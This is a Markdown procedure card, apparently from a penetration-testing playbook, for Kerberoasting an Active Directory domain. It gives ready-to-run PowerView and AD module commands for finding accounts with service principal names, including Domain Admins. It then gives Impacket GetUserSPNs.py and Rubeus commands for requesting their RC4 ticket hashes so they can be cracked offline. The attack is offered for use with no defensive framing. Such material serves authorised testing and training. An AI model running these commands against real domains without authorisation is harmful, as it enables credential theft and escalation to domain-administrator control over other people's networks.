---
id: 5c4a122e-dccb-45ab-9ec8-4968664b983d
name: Find kerberoast-able user (credentials)
type: procedure
verified: false
submitted: false
created_at: '2023-01-12T17:49:32.623152+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
commands:
- '[[GetUserSPN.py Query Domain for SPNs and Dump Available Hashes]]'
- '[[List AD Accounts with SPN Set using ADModule]]'
- '[[List Domain Admins with SPN Set using PowerView]]'
- '[[PowerView List AD Accounts with SPN Set]]'
- '[[Request RC4 HASH for SPN User]]'
---

# Find kerberoast-able user (credentials)

## Summary

Domain services running with user accounts have a ServicePrincipalName (SPN). Requesting the hash for the user from DC to then crack. 

## Description

# Description

Domain services running with user accounts have a ServicePrincipalName (SPN). Requesting the hash for the user from DC to then crack.



## Objective

1. Find a user or admin with SPN

2. Request hash for user or admin from DC



# Instructions

1. Find a user with Service Principal Name (SPN) using PowerView





**Command** ([[PowerView List AD Accounts with SPN Set]]):

```bash
Get-DomainUser -SPN
```



(Alternative) Find a user with SPN using AD Module





**Command** ([[List AD Accounts with SPN Set using ADModule]]):

```bash
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```





(Optional) List Admin accounts with SPN Set using PowerView





**Command** ([[List Domain Admins with SPN Set using PowerView]]):

```bash
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```



2. Request hash for user or admin from Domain Controller using Impacket





**Command** ([[GetUserSPN.py Query Domain for SPNs and Dump Available Hashes]]):

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
```



(Optional) Request hash using Rubeus and specify only RC4 hash





**Command** ([[Request RC4 HASH for SPN User]]):

```bash
Rubeus.exe kerberoast /user:$USERNAME /simple /rc4opsec /outfile:C:\hash.text
```







## Commands Used

- [[GetUserSPN.py Query Domain for SPNs and Dump Available Hashes]]
- [[List AD Accounts with SPN Set using ADModule]]
- [[List Domain Admins with SPN Set using PowerView]]
- [[PowerView List AD Accounts with SPN Set]]
- [[Request RC4 HASH for SPN User]]


